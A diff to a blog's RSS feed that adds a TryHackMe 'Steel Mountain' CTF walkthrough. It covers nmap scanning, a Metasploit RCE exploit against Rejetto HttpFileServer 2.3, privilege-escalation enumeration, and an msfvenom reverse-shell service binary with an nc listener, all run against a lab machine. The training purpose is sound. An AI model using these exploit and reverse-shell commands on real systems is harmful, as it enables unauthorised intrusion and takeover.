@@ -5,9 +5,173 @@
     <description>Sinameki Sarp&apos;s CTF Writeups and blogposts...</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 24 Nov 2022 12:18:23 +0300</pubDate>
-    <lastBuildDate>Thu, 24 Nov 2022 12:18:23 +0300</lastBuildDate>
+    <pubDate>Sun, 27 Nov 2022 21:58:48 +0300</pubDate>
+    <lastBuildDate>Sun, 27 Nov 2022 21:58:48 +0300</lastBuildDate>
     <generator>Jekyll v4.3.1</generator>
+    
+      <item>
+        <title>TryHackMe: Steel Mountain CTF Writeup</title>
+        <description>&lt;p&gt;TryHackMe easy level windows machine Steel Mountain boot2root walkthrough.&lt;/p&gt;
+
+&lt;h2 id=&quot;discovery-part&quot;&gt;Discovery Part&lt;/h2&gt;
+
+&lt;p&gt;Let’s begin with nmap port scan.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.10.161.65
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are 2 web server on the ports. 80 and 8080. Nmap trying to find all ports with “&lt;strong&gt;-p-&lt;/strong&gt;” &lt;em&gt;**&lt;/em&gt;argument but it will be take time so let’s starts with web servers.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%201.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Source code:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%202.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I try directory fuzzing but nothing in there. Check port 8080.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%203.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This page is interesting because there is file server version info in “&lt;strong&gt;Server Information&lt;/strong&gt;” section. I Search “&lt;strong&gt;HttpFileServer 2.3&lt;/strong&gt;” on the internet.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%204.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Full name is “&lt;strong&gt;Rejetto Http File Server&lt;/strong&gt;”. Let’s find is there any vulnerabilty for version.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%205.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s looks like “&lt;strong&gt;metasploit&lt;/strong&gt;” has “&lt;strong&gt;RCE(Remote Code Execution)&lt;/strong&gt;” exploit. Go to msfconsole…&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration-part&quot;&gt;Enumeration Part&lt;/h2&gt;
+
+&lt;p&gt;Search exploit and select what we want.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%206.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Look and set exploit’s options.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%207.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We need to change “&lt;strong&gt;RHOSTS,RPORT,LHOST,LPORT,SRVHOST,SRVPORT&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RHOST** ⇒ &amp;lt;Target-Ip&amp;gt; (In my case will be 10.10.161.65)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPORT** ⇒ &amp;lt;Target-Port&amp;gt; (In my case will be 8080)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LHOST** ⇒ &amp;lt;Local-Ip&amp;gt; (In my case will be 10.10.121.211)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LPORT** ⇒ &amp;lt;Listen-Port&amp;gt; (In my case will be 10.10.121.211)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SRVHOST** ⇒ &amp;lt;Local-WebServer-Ip&amp;gt; (In my case will be 10.10.121.211)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;**&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SRVPORT** ⇒ &amp;lt;Local-WebServer-Port&amp;gt; (In my case will be 4545)&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;VALUE&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We complete to assign all necessary option. Let’s run exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%208.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;aside&gt;
+💡 `**Note: Exploit run can take times you must wait until finish and also if exploit not work you should check options and run again**`
+
+&lt;/aside&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%209.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It’s looks like we are “&lt;strong&gt;bill&lt;/strong&gt;” user. Let’s go to “&lt;strong&gt;C:\Users\bill\Desktop&lt;/strong&gt;” and find user flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2010.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-part&quot;&gt;Privilege Escalation Part&lt;/h2&gt;
+
+&lt;p&gt;Check system has any privilege escalation vulnerability. I will use “&lt;strong&gt;winpeas&lt;/strong&gt;” tool. First upload “&lt;strong&gt;winpeas.exe&lt;/strong&gt;” to target machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;(WinPeas: &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&quot;&gt;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&lt;/a&gt;)&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2011.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We need to access “&lt;strong&gt;Windows Powershell&lt;/strong&gt;” to run winPEAS.exe. First we have to load powershell module to our meterpreter.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;load&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then we need to start powershell command.&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;n&quot;&gt;powershell_shell&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and run ./winPEAS.exe on powershell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2012.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and also we can use “&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;” powershell script for find to way privledge escaletion. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(Both tool is working correctly and give same result)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;em&gt;PowerUp.Ps1:&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2013.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2014.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;with both script result we find our user has permission to write and add file  “&lt;strong&gt;AdvancedSystemCareService9&lt;/strong&gt;” service and also this service can restart with manually.&lt;/p&gt;
+
+&lt;p&gt;First we need to create executable reverse shell for root user. We can use “&lt;strong&gt;msfvenom&lt;/strong&gt;” tool.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.121.211 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4443 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; x86/shikata_ga_nai &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe-service &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; Advanced.exe
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Our executable file is ready. Let’s upload the machine and rename to “&lt;strong&gt;ASCService.exe&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2015.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Change to location and overwrite to file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2016.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our exe is ready. In another terminal we need to listen port which we specifed msfvenom.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4443
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First stop the service then start again.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Stop: sc stop **AdvancedSystemCareService9**&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Start: sc start **AdvancedSystemCareService9**&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Steel%20Mountain%20Writeup%2061a68838550e4cd5b1df3e85ad7bdbc2/Untitled%2017.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;thank-you-for-reading-&quot;&gt;THANK YOU FOR READING 🙂&lt;/h3&gt;
+</description>
+        <pubDate>Sun, 27 Nov 2022 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/TryHackMe-SteelMountain/</link>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-SteelMountain/</guid>
+        
+        <category>red</category>
+        
+        <category>yellow</category>
+        
+        
+        <category>TryHackMe</category>
+        
+        <category>CTF</category>
+        
+        <category>Writeup</category>
+        
+      </item>
     
       <item>
         <title>TryHackMe: Empline CTF Writeup</title>
